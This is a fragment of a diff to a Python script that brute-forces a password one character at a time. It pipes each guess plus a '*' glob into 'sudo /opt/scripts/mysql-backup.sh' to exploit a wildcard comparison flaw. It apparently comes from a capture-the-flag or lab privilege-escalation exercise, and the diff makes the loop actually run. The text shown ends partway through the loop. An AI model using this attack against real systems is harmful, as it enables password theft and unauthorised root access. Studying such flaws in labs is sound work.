@@ -2,9 +2,9 @@ import string
 import subprocess
 import pty
 total = list(string.ascii_letters + string.digits)
-a = 0
+
 password = ""
-while a!=0:
+while True:
 	for t in total:
 		cmd = f"echo {password}{t}* | sudo /opt/scripts/mysql-backup.sh"
 		#pty.spawn(cmd)
